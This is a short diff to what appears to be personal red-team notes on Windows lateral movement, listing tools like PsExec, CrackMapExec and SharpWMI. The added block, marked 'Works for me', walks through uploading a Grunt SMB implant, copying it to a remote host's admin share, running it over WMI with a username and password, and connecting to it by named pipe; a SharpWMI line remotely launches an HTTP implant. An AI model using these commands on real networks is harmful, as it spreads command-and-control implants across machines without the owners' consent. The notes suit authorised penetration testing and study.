@@ -9,6 +9,13 @@ PowerShell Remoting
 PsExec
 Crackmapexec
 
+#Works for me
+upload gruntsmb.exe c:\temp\upload
+go to c:\temp
+copy c:\temp \\hostname\c$\Users\x.exe
+wmicommnad hostname c:\Users\x.exe user pass
+connect hostname pipensmb
+
 SharpWMI
 SharpWMI /command:"action=exec computername=computer command=\"C:\Windows\Temp\GruntHTTP.exe\""
 
